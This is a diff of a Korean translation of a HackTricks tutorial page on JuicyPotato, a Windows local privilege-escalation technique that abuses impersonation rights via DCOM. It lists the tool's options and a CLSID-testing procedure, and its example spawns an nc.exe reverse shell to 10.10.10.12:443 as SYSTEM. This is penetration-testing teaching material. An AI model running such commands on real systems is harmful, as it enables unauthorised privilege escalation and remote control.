@@ -16,7 +16,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 {% hint style="warning" %}
-**JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이상에서 **작동하지 않습니다. 그러나** [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM`** 수준의 액세스를 얻을 수 있습니다. _**확인:**_
+**JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이상에서 **작동하지 않습니다. 그러나** [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM`** 수준의 접근을 얻을 수 있습니다. _**확인:**_
 {% endhint %}
 
 {% content-ref url="roguepotato-and-printspoofer.md" %}
@@ -52,17 +52,17 @@ _조금의 주스를 더한_ [_RottenPotatoNG_](https://github.com/breenmachine/
 JuicyPotato는 다음을 허용합니다:
 
 * **대상 CLSID** _원하는 CLSID를 선택하세요._ [_여기_](http://ohpe.it/juicy-potato/CLSID/) _에서 OS별로 정리된 목록을 찾을 수 있습니다._
-* **COM 리스닝 포트** _선호하는 COM 리스닝 포트를 정의하세요(하드코딩된 6666 대신)_
+* **COM 리스닝 포트** _선호하는 COM 리스닝 포트를 정의하세요 (하드코딩된 6666 대신)_
 * **COM 리스닝 IP 주소** _서버를 원하는 IP에 바인딩하세요_
 * **프로세스 생성 모드** _임시 사용자 권한에 따라 선택할 수 있습니다:_
 * `CreateProcessWithToken` (필요: `SeImpersonate`)
 * `CreateProcessAsUser` (필요: `SeAssignPrimaryToken`)
 * `둘 다`
-* **시작할 프로세스** _익스플로잇이 성공하면 실행할 실행 파일 또는 스크립트_
+* **실행할 프로세스** _악용이 성공하면 실행할 실행 파일 또는 스크립트_
 * **프로세스 인수** _실행된 프로세스 인수를 사용자 정의하세요_
 * **RPC 서버 주소** _은밀한 접근을 위해 외부 RPC 서버에 인증할 수 있습니다_
 * **RPC 서버 포트** _외부 서버에 인증하고 방화벽이 포트 `135`를 차단하는 경우 유용합니다…_
-* **테스트 모드** _주로 테스트 목적, 즉 CLSID 테스트를 위한 것입니다. DCOM을 생성하고 토큰의 사용자를 출력합니다. _[_테스트를 위한 여기_](http://ohpe.it/juicy-potato/Test/)를 참조하세요._
+* **테스트 모드** _주로 테스트 목적을 위해, 즉 CLSID 테스트. DCOM을 생성하고 토큰의 사용자를 출력합니다. _[_테스트를 위한 여기_](http://ohpe.it/juicy-potato/Test/)를 참조하세요._
 
 ### Usage <a href="#usage" id="usage"></a>
 ```
@@ -81,23 +81,23 @@ Optional args:
 -k <ip>: RPC server ip address (default 127.0.0.1)
 -n <port>: RPC server listen port (default 135)
 ```
-### 최종 생각 <a href="#final-thoughts" id="final-thoughts"></a>
+### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**juicy-potato Readme에서**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
-사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면, 당신은 **SYSTEM**입니다.
+사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면 당신은 **SYSTEM**입니다.
 
 이 모든 COM 서버의 남용을 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체의 권한을 수정하는 것을 고려할 수 있지만, 행운을 빕니다. 이는 도전적일 것입니다.
 
-실제 해결책은 `* SERVICE` 계정 아래에서 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 이 익스플로잇을 확실히 억제할 수 있지만, 기본 OS에 심각한 영향을 미칠 수 있습니다.
+실제 해결책은 `* SERVICE` 계정으로 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 이 익스플로잇을 확실히 억제할 수 있지만, 기본 OS에 심각한 영향을 미칠 수 있습니다.
 
-출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
+From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
-## 예시
+## Examples
 
-참고: 시도할 CLSID 목록은 [이 페이지](https://ohpe.it/juicy-potato/CLSID/)를 방문하세요.
+Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.
 
-### nc.exe 리버스 셸 얻기
+### Get a nc.exe reverse shell
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -124,15 +124,15 @@ c:\Users\Public>
 
 {% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
 
-### **CLSID 확인하기**
+### **CLSID 확인**
 
 먼저, juicypotato.exe 외에 몇 가지 실행 파일이 필요합니다.
 
 [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)를 다운로드하고 PS 세션에 로드한 후, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)를 다운로드하여 실행합니다. 해당 스크립트는 테스트할 수 있는 CLSID 목록을 생성합니다.
 
-그런 다음 [test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID 목록과 juicypotato 실행 파일의 경로를 변경) 을 다운로드하고 실행합니다. 이 스크립트는 모든 CLSID를 시도하기 시작하며, **포트 번호가 변경되면 CLSID가 작동했음을 의미합니다**.
+그런 다음 [test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID 목록과 juicypotato 실행 파일의 경로를 변경) 을 다운로드하고 실행합니다. 그러면 모든 CLSID를 시도하기 시작하며, **포트 번호가 변경되면 CLSID가 작동했음을 의미합니다**.
 
-**-c 매개변수를 사용하여** 작동하는 CLSID를 **확인하세요.**
+**매개변수 -c를 사용하여** 작동하는 CLSID를 **확인하십시오.**
 
 ## 참고 문헌
 
@@ -149,7 +149,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
